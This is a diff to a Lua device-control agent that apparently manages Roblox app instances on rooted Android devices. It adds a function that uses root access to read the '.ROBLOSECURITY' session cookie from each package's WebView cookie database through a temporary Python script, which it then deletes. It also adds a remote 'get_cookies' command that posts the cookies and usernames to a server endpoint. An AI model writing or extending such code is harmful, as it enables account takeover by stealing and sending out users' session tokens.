@@ -885,6 +885,32 @@ local function autoexec_remove(filename)
   log(C.yellow .. "[" .. ts() .. "] autoexec removed " .. safe .. C.reset)
 end
 
+-- ─── Cookie extraction ───
+local function get_cookies()
+  local pkgs = collect_packages()
+  local results = {}
+  local py_script = CONFIG_DIR .. "/.cookie_extract.py"
+  fwrite(py_script, [[
+import sqlite3,sys
+try:
+    c=sqlite3.connect(sys.argv[1])
+    r=c.execute("SELECT value FROM cookies WHERE host_key='.roblox.com' AND name='.ROBLOSECURITY'").fetchone()
+    if r: print(r[0])
+    else: print('')
+except: print('')
+]])
+  for _, p in ipairs(pkgs) do
+    local pkg = p.pkg
+    local db = string.format("/data/data/%s/app_webview/Default/Cookies", pkg)
+    local cookie = shell(string.format('su -c "python %s %s"', py_script, db))
+    if cookie ~= "" then
+      results[#results+1] = { pkg = pkg, username = p.username or "", cookie = cookie }
+    end
+  end
+  os.remove(py_script)
+  return results
+end
+
 -- ─── Auto-rejoin state + helpers ───
 -- Everything auto-rejoin needs to remember lives in these tables, keyed by
 -- package name. The main loop calls maybe_auto_rejoin() every tick; the
@@ -1484,6 +1510,11 @@ while true do
             autoexec_remove(cmd.filename)
           elseif cmd.type == "uninstall" then
             uninstall_pkg(cmd.package)
+          elseif cmd.type == "get_cookies" then
+            log(C.cyan .. "[" .. ts() .. "] extracting cookies..." .. C.reset)
+            local cookies = get_cookies()
+            log(C.green .. "[" .. ts() .. "] extracted " .. #cookies .. " cookie(s)" .. C.reset)
+            http_post("/api/device-control/cookies", { deviceId = DEVICE_ID, cookies = cookies })
           end
         end
         if #batch > 0 then batch_launch(batch) end
@@ -1521,6 +1552,11 @@ while true do
               autoexec_remove(cmd.filename)
             elseif cmd.type == "uninstall" then
               uninstall_pkg(cmd.package)
+            elseif cmd.type == "get_cookies" then
+              log(C.cyan .. "[" .. ts() .. "] extracting cookies..." .. C.reset)
+              local cookies = get_cookies()
+              log(C.green .. "[" .. ts() .. "] extracted " .. #cookies .. " cookie(s)" .. C.reset)
+              http_post("/api/device-control/cookies", { deviceId = DEVICE_ID, cookies = cookies })
             end
           end
           if #batch > 0 then batch_launch(batch) end
